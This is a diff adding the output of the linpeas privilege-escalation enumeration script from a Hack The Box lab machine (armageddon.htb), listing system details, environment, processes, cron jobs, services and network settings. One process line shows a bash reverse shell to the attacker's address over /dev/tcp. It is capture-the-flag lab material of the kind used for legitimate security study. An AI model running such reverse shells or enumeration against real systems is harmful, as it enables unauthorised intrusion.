@@ -1,0 +1,1432 @@
+
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v3.2.3 by carlospolop
+                                                                                                                    
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                                    
+                                                                                                                    
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:                                                                                                            
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look to it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+
+════════════════════════════════════╣ Basic information ╠════════════════════════════════════
+OS: Linux version 3.10.0-1160.6.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Tue Nov 17 13:59:11 UTC 2020
+User & Groups: uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+Hostname: armageddon.htb
+Writable folder: /dev/shm
+[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[-] No port scan capabilities (nc not found)                                                                        
+                                                                                                                    
+
+Caching directories using 2 threads . . . . . . . . . . . . . . . . . . . . . . . . DONE
+                                                                                                                    
+════════════════════════════════════╣ System Information ╠════════════════════════════════════
+[+] Operative system                                                                                                
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                     
+Linux version 3.10.0-1160.6.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Tue Nov 17 13:59:11 UTC 2020
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                        
+Sudo version 1.8.23                                                                                                 
+
+[+] USBCreator
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                                                                                            
+                                                                                                                    
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                
+/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin                                                                                                
+New path exported: /usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin:/sbin:/bin
+
+[+] Date
+Mon Jul 26 00:42:29 BST 2021                                                                                        
+
+[+] System stats
+Filesystem               Size  Used Avail Use% Mounted on                                                           
+devtmpfs                 1.9G     0  1.9G   0% /dev
+tmpfs                    1.9G  336K  1.9G   1% /dev/shm
+tmpfs                    1.9G  9.1M  1.9G   1% /run
+tmpfs                    1.9G     0  1.9G   0% /sys/fs/cgroup
+/dev/mapper/centos-root   14G  2.1G   12G  16% /
+/dev/loop1                98M   98M     0 100% /var/lib/snapd/snap/core/10444
+/dev/loop0               100M  100M     0 100% /var/lib/snapd/snap/core/10859
+/dev/sda1               1014M  189M  826M  19% /boot
+tmpfs                    379M     0  379M   0% /run/user/1000
+              total        used        free      shared  buff/cache   available
+Mem:        3880508      542400     2987756        9680      350352     3083012
+Swap:       1679356           0     1679356
+
+[+] CPU info
+Architecture:          x86_64                                                                                       
+CPU op-mode(s):        32-bit, 64-bit
+Byte Order:            Little Endian
+CPU(s):                2
+On-line CPU(s) list:   0,1
+Thread(s) per core:    1
+Core(s) per socket:    1
+Socket(s):             2
+NUMA node(s):          1
+Vendor ID:             AuthenticAMD
+CPU family:            23
+Model:                 1
+Model name:            AMD EPYC 7401P 24-Core Processor
+Stepping:              2
+CPU MHz:               2000.000
+BogoMIPS:              4000.00
+Hypervisor vendor:     VMware
+Virtualization type:   full
+L1d cache:             32K
+L1i cache:             64K
+L2 cache:              512K
+L3 cache:              65536K
+NUMA node0 CPU(s):     0,1
+Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc art rep_good nopl tsc_reliable nonstop_tsc extd_apicid eagerfpu pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw retpoline_amd ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec clzero arat overflow_recov succor
+
+[+] Environment
+[i] Any private information inside environment variables?                                                           
+XDG_SESSION_ID=117                                                                                                  
+HOSTNAME=armageddon.htb
+SELINUX_ROLE_REQUESTED=
+SHELL=/bin/bash
+TERM=xterm-256color
+HISTSIZE=0
+SSH_CLIENT=10.10.14.10 39364 22
+SELINUX_USE_CURRENT_RANGE=
+SSH_TTY=/dev/pts/0
+HISTFILESIZE=0
+USER=brucetherealadmin
+LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:do=38;5;5:bd=48;5;232;38;5;11:cd=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:
+PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin:/sbin:/bin
+MAIL=/var/spool/mail/brucetherealadmin
+PWD=/dev/shm
+LANG=en_NZ.UTF-8
+SELINUX_LEVEL_REQUESTED=
+HISTCONTROL=ignoredups
+HOME=/home/brucetherealadmin
+SHLVL=2
+LOGNAME=brucetherealadmin
+SSH_CONNECTION=10.10.14.10 39364 10.10.10.233 22
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+LESSOPEN=||/usr/bin/lesspipe.sh %s
+XDG_RUNTIME_DIR=/run/user/1000
+HISTFILE=/dev/null
+_=/usr/bin/env
+
+[+] Searching Signature verification failed in dmseg
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                 
+ Not Found                                                                                                          
+                                                                                                                    
+[+] AppArmor enabled? .............. AppArmor Not Found
+[+] grsecurity present? ............ grsecurity Not Found                                                           
+[+] PaX bins present? .............. PaX Not Found                                                                  
+[+] Execshield enabled? ............ Execshield Not Found                                                           
+[+] SELinux enabled? ............... SELinux status:                 enabled                                        
+SELinuxfs mount:                /sys/fs/selinux
+SELinux root directory:         /etc/selinux
+Loaded policy name:             targeted
+Current mode:                   enforcing
+Mode from config file:          enforcing
+Policy MLS status:              enabled
+Policy deny_unknown status:     allowed
+Max kernel policy version:      31
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a virtual machine? ..... Yes (vmware)                                                                   
+
+═════════════════════════════════════════╣ Containers ╠══════════════════════════════════════════
+[+] Is this a container? ........... No                                                                             
+                                                                                                                    
+[+] Container related tools present
+which: no docker in (/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin:/sbin:/bin)
+which: no lxc in (/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin:/sbin:/bin)
+which: no rkt in (/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin:/sbin:/bin)
+which: no kubectl in (/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin:/sbin:/bin)
+which: no podman in (/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin:/sbin:/bin)
+which: no runc in (/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin:/sbin:/bin)
+[+] Any running containers? ........ No
+                                                                                                                    
+═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════
+[+] Any sd*/disk* disk in /dev? (limit 20)                                                                          
+disk                                                                                                                
+sda
+sda1
+sda2
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices                                                                         
+                                                                                                                    
+/dev/mapper/centos-root /                       xfs     defaults        0 0
+UUID=8fcc6698-440b-4a43-876e-adbab5379d40 /boot                   xfs     defaults        0 0
+/dev/mapper/centos-swap swap                    swap    defaults        0 0
+
+
+════════════════════════════════════╣ Available Software ╠════════════════════════════════════
+[+] Useful software                                                                                                 
+/usr/bin/curl                                                                                                       
+/usr/bin/ping
+/usr/bin/make
+/usr/bin/base64
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python3
+/usr/bin/python2.7
+/usr/bin/python3.6
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/sudo
+
+[+] Installed Compiler
+                                                                                                                    
+
+══════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════
+[+] Cleaned processes                                                                                               
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                
+root         1  0.0  0.1 193544  6696 ?        Ss   Jul25   0:03 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
+root       489  0.0  0.1  39056  4340 ?        Ss   Jul25   0:00 /usr/lib/systemd/systemd-journald
+root       519  0.0  0.1 201112  4136 ?        Ss   Jul25   0:00 /usr/sbin/lvmetad -f
+root       525  0.0  0.1  48412  4968 ?        Ss   Jul25   0:00 /usr/lib/systemd/systemd-udevd
+root       647  0.0  0.0  55532   856 ?        S<sl Jul25   0:00 /sbin/auditd
+root       670  0.0  0.1 168148  5048 ?        Ss   Jul25   0:00 /usr/bin/VGAuthService -s
+root       671  0.0  0.1 355212  5316 ?        Ssl  Jul25   0:05 /usr/bin/vmtoolsd
+root       672  0.0  0.0  21684  1304 ?        Ss   Jul25   0:00 /usr/sbin/irqbalance --foreground
+dbus       674  0.0  0.0  66456  2560 ?        Ssl  Jul25   0:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+  └─(Caps) 0x0000000020000000=cap_audit_write
+root       683  0.0  0.2 474284  8752 ?        Ssl  Jul25   0:00 /usr/sbin/NetworkManager --no-daemon[0m
+root       685  0.0  0.0  26384  1756 ?        Ss   Jul25   0:00 /usr/lib/systemd/systemd-logind
+polkitd    686  0.0  0.3 612232 13144 ?        Ssl  Jul25   0:00 /usr/lib/polkit-1/polkitd --no-debug
+root       687  0.0  0.7 990532 29632 ?        Ssl  Jul25   0:00 /usr/libexec/snapd/snapd
+root       691  0.0  0.0 126388  1692 ?        Ss   Jul25   0:01 /usr/sbin/crond -n
+root       710  0.0  0.0 110208   856 tty1     Ss+  Jul25   0:00 /sbin/agetty --noclear tty1 linux
+root       967  0.0  0.4 574288 17472 ?        Ssl  Jul25   0:01 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
+root       968  0.0  0.3 450300 14940 ?        Ss   Jul25   0:00 /usr/sbin/httpd -DFOREGROUND
+apache    1147  0.0  0.6 462272 23728 ?        S    Jul25   0:01  _ /usr/sbin/httpd -DFOREGROUND
+apache    1150  0.0  0.6 462012 23416 ?        S    Jul25   0:01  _ /usr/sbin/httpd -DFOREGROUND
+apache    4186  0.0  0.0  11688  1128 ?        S    00:37   0:00  |   _ bash -c bash -i >& /dev/tcp/10.10.14.10/4444 0>&1
+apache    4187  0.0  0.0  11824  1652 ?        S    00:37   0:00  |       _ bash -i
+apache    1948  0.0  0.6 462264 23724 ?        S    Jul25   0:01  _ /usr/sbin/httpd -DFOREGROUND
+apache    1955  0.0  0.6 462788 24188 ?        S    Jul25   0:02  _ /usr/sbin/httpd -DFOREGROUND
+apache    1962  0.0  0.6 462268 23636 ?        S    Jul25   0:01  _ /usr/sbin/httpd -DFOREGROUND
+apache    2026  0.0  0.6 462908 24416 ?        S    Jul25   0:01  _ /usr/sbin/httpd -DFOREGROUND
+apache    2029  0.0  0.6 462068 23476 ?        S    Jul25   0:01  _ /usr/sbin/httpd -DFOREGROUND
+apache    2034  0.0  0.5 461276 22696 ?        S    Jul25   0:01  _ /usr/sbin/httpd -DFOREGROUND
+apache    2071  0.0  0.6 462568 23988 ?        S    Jul25   0:01  _ /usr/sbin/httpd -DFOREGROUND
+apache    2074  0.0  0.6 463208 24644 ?        S    Jul25   0:01  _ /usr/sbin/httpd -DFOREGROUND
+root       970  0.0  0.1 112936  4356 ?        Ss   Jul25   0:00 /usr/sbin/sshd -D
+bruceth+  4239  0.0  0.0 154728  2424 ?        S    00:40   0:00      _ sshd: brucetherealadmin@pts/0
+bruceth+  4240  0.0  0.0 116052  2652 pts/0    Ss   00:40   0:00          _ -bash
+bruceth+  4303  1.0  0.0 113904  2232 pts/0    S+   00:42   0:00              _ bash linpeas.sh
+bruceth+  4990  0.0  0.0 113904  1264 pts/0    S+   00:42   0:00                  _ bash linpeas.sh
+bruceth+  4994  0.0  0.0 155588  1984 pts/0    R+   00:42   0:00                  |   _ ps fauxwww
+bruceth+  4993  0.0  0.0 113904  1060 pts/0    S+   00:42   0:00                  _ bash linpeas.sh
+root       971  0.0  0.1 216400  5272 ?        Ssl  Jul25   0:00 /usr/sbin/rsyslogd -n
+mysql     1064  0.0  0.0 113416  1600 ?        Ss   Jul25   0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
+mysql     1440  0.0  2.7 1168552 105536 ?      Sl   Jul25   0:04  _ /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var/run/mariadb/mariadb.pid --socket=/var/lib/mysql/mysql.sock
+root      1416  0.0  0.0  89744  2136 ?        Ss   Jul25   0:00 /usr/libexec/postfix/master -w
+postfix   1427  0.0  0.1  89916  4100 ?        S    Jul25   0:00  _ qmgr -l -t unix -u
+postfix   4055  0.0  0.1  89848  4080 ?        S    00:30   0:00  _ pickup -l -t unix -u
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                           
+   0 lrwxrwxrwx. 1 root root    4 Dec  3  2020 /bin/sh -> bash                                                      
+ 52K -rwxr-xr-x. 1 root root  49K Sep 30  2020 /sbin/agetty
+128K -rwxr-xr-x. 1 root root 126K Aug  8  2019 /sbin/auditd
+220K -rwxr-xr-x. 1 root root 218K Sep 30  2020 /usr/bin/dbus-daemon
+   0 lrwxrwxrwx. 1 root root    9 Dec  3  2020 /usr/bin/python2 -> python2.7
+132K -rwxr-xr-x. 1 root root 130K Nov 16  2020 /usr/bin/VGAuthService
+ 56K -rwxr-xr-x. 1 root root  56K Nov 16  2020 /usr/bin/vmtoolsd
+ 14M -rwxr-xr-x. 1 root root  14M Oct  1  2020 /usr/libexec/mysqld
+172K -rwxr-xr-x. 1 root root 169K Apr  1  2020 /usr/libexec/postfix/master
+ 17M -rwxr-xr-x. 1 root root  17M Oct 14  2020 /usr/libexec/snapd/snapd
+120K -rwxr-xr-x. 1 root root 118K Apr  1  2020 /usr/lib/polkit-1/polkitd
+1.6M -rwxr-xr-x. 1 root root 1.6M Nov 16  2020 /usr/lib/systemd/systemd
+340K -rwxr-xr-x. 1 root root 339K Nov 16  2020 /usr/lib/systemd/systemd-journald
+628K -rwxr-xr-x. 1 root root 625K Nov 16  2020 /usr/lib/systemd/systemd-logind
+408K -rwxr-xr-x. 1 root root 407K Nov 16  2020 /usr/lib/systemd/systemd-udevd
+ 72K -rwxr-xr-x. 1 root root  69K Aug  9  2019 /usr/sbin/crond
+512K -rwxr-xr-x. 1 root root 512K Nov 16  2020 /usr/sbin/httpd
+ 52K -rwxr-xr-x. 1 root root  49K Aug  9  2019 /usr/sbin/irqbalance
+ 72K -r-xr-xr-x. 1 root root  72K Sep 30  2020 /usr/sbin/lvmetad
+2.9M -rwxr-xr-x. 1 root root 2.9M Nov 16  2020 /usr/sbin/NetworkManager
+652K -rwxr-xr-x. 1 root root 649K Sep 30  2020 /usr/sbin/rsyslogd
+836K -rwxr-xr-x. 1 root root 833K Aug  9  2019 /usr/sbin/sshd
+
+[+] Files opened by processes belonging to other users
+[i] This is usually empty because of the lack of privileges to read other user processes information                
+                                                                                                                    
+[+] Processes with credentials in memory (root req)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                     
+gdm-password Not Found                                                                                              
+gnome-keyring-daemon Not Found                                                                                      
+lightdm Not Found                                                                                                   
+vsftpd Not Found                                                                                                    
+apache2 Not Found                                                                                                   
+sshd: process found (dump creds from memory as root)                                                                
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                 
+/usr/bin/crontab                                                                                                    
+incrontab Not Found
+-rw-------. 1 root root   0 Aug  9  2019 /etc/cron.deny                                                             
+-rw-r--r--. 1 root root 451 Jun  9  2014 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x.  2 root root   21 Dec  3  2020 .
+drwxr-xr-x. 77 root root 8192 Jul 25 22:50 ..
+-rw-r--r--.  1 root root  128 Aug  9  2019 0hourly
+
+/etc/cron.daily:
+total 20
+drwxr-xr-x.  2 root root   42 Dec  3  2020 .
+drwxr-xr-x. 77 root root 8192 Jul 25 22:50 ..
+-rwx------.  1 root root  219 Apr  1  2020 logrotate
+-rwxr-xr-x.  1 root root  618 Oct 30  2018 man-db.cron
+
+/etc/cron.hourly:
+total 16
+drwxr-xr-x.  2 root root   22 Dec  3  2020 .
+drwxr-xr-x. 77 root root 8192 Jul 25 22:50 ..
+-rwxr-xr-x.  1 root root  392 Aug  9  2019 0anacron
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x.  2 root root    6 Jun  9  2014 .
+drwxr-xr-x. 77 root root 8192 Jul 25 22:50 ..
+
+/etc/cron.weekly:
+total 12
+drwxr-xr-x.  2 root root    6 Jun  9  2014 .
+drwxr-xr-x. 77 root root 8192 Jul 25 22:50 ..
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+
+
+
+[+] Services
+[i] Search for outdated versions                                                                                    
+netconsole module not loaded                                                                                        
+Configured devices:
+lo ens192
+Currently active devices:
+lo ens192
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                         
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin                                                              
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services                                            
+/var/lib/snapd/snap/core/10444/lib/systemd/system/emergency.service is executing some relative path                 
+/var/lib/snapd/snap/core/10444/lib/systemd/system/networking.service is executing some relative path
+/var/lib/snapd/snap/core/10444/lib/systemd/system/rescue.service is executing some relative path
+/var/lib/snapd/snap/core/10859/lib/systemd/system/emergency.service is executing some relative path
+/var/lib/snapd/snap/core/10859/lib/systemd/system/networking.service is executing some relative path
+/var/lib/snapd/snap/core/10859/lib/systemd/system/rescue.service is executing some relative path
+You can't write on systemd PATH
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                              
+NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
+Mon 2021-07-26 23:04:51 BST  22h left Sun 2021-07-25 23:04:51 BST  1h 37min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+n/a                          n/a      n/a                          n/a          systemd-readahead-done.timer systemd-readahead-done.service
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                              
+                                                                                                                    
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                             
+                                                                                                                    
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                             
+Socket /run/snapd.socket owned by root uses HTTP. Response to /index:                                               
+{"type":"error","status-code":404,"status":"Not Found","result":{"message":"not found"}}
+Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
+{"type":"error","status-code":404,"status":"Not Found","result":{"message":"not found"}}
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                               
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.PolicyKit1.conf (  <policy user="polkitd">  
+  <policy user="polkitd">)
+
+[+] D-Bus Service Objects list
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                               
+NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
+:1.0                                     1 systemd         root             :1.0          -                         -          -
+:1.1                                   685 systemd-logind  root             :1.1          systemd-logind.service    -          -
+:1.2                                   686 polkitd         polkitd          :1.2          polkit.service            -          -
+:1.20                                  967 tuned           root             :1.20         tuned.service             -          -
+:1.265                               19980 busctl          brucetherealadmi :1.265        session-117.scope         117        -
+:1.3                                   683 NetworkManager  root             :1.3          NetworkManager.service    -          -
+:1.7                                   683 NetworkManager  root             :1.7          NetworkManager.service    -          -
+com.redhat.ifcfgrh1                    683 NetworkManager  root             :1.7          NetworkManager.service    -          -
+com.redhat.tuned                       967 tuned           root             :1.20         tuned.service             -          -
+fi.epitest.hostap.WPASupplicant          - -               -                (activatable) -                         -
+fi.w1.wpa_supplicant1                    - -               -                (activatable) -                         -
+org.freedesktop.DBus                   674 dbus-daemon     dbus             org.freedesktop.DBus dbus.service              -          -
+org.freedesktop.NetworkManager         683 NetworkManager  root             :1.3          NetworkManager.service    -          -
+org.freedesktop.PolicyKit1             686 polkitd         polkitd          :1.2          polkit.service            -          -
+org.freedesktop.hostname1                - -               -                (activatable) -                         -
+org.freedesktop.import1                  - -               -                (activatable) -                         -
+org.freedesktop.locale1                  - -               -                (activatable) -                         -
+org.freedesktop.login1                 685 systemd-logind  root             :1.1          systemd-logind.service    -          -
+org.freedesktop.machine1                 - -               -                (activatable) -                         -
+org.freedesktop.nm_dispatcher            - -               -                (activatable) -                         -
+org.freedesktop.systemd1                 1 systemd         root             :1.0          -                         -          -
+org.freedesktop.timedate1                - -               -                (activatable) -                         -
+
+
+═══════════════════════════════════╣ Network Information ╠════════════════════════════════════
+[+] Hostname, hosts and DNS                                                                                         
+armageddon.htb                                                                                                      
+127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
+::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
+search 1.0.0.1 htb
+nameserver 1.1.1.1
+htb
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found                                                                                           
+                                                                                                                    
+[+] Interfaces
+default 0.0.0.0                                                                                                     
+loopback 127.0.0.0
+link-local 169.254.0.0
+ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.233  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 fe80::7648:5ea1:5371:b3b5  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef::69d1:bb00:780c:f997  prefixlen 64  scopeid 0x0<global>
+        ether 00:50:56:b9:7c:84  txqueuelen 1000  (Ethernet)
+        RX packets 209371  bytes 32916406 (31.3 MiB)
+        RX errors 0  dropped 49  overruns 0  frame 0
+        TX packets 200889  bytes 85018668 (81.0 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
